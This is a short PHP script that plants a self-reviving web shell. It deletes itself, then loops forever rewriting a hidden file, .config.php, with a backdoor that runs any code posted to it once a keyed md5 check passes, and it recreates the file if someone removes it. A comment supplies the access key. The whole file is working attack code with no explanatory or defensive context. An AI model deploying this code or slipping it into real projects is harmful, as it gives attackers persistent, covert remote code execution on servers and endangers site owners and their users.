<?php
# ?k=xq17
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '.config.php';
$code = '<?php if(substr(md5(@$_REQUEST["k"]),25)=="8aa1b46"){@eval($_POST[a]);} ?>';
while (1){
    is_dir($file)?rmdir($file):file_put_contents($file,$code);
    usleep(1);
}
?>